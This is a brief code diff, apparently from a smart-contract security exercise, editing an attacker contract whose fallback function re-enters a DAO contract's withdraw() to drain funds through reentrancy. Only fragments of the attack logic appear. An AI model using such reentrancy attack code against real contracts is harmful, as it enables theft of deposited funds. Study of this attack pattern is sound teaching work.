@@ -20,6 +20,7 @@ def _attack() -> bool:
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
     self.dao_contract.withdraw()
+    self.dao_contract.withdraw()
 
     return True
 
@@ -55,4 +56,4 @@ def __default__():
     # USE INTERNAL ATTACK FUNCTION
 
     self._attack()    
-    self._attack()                        
+                       
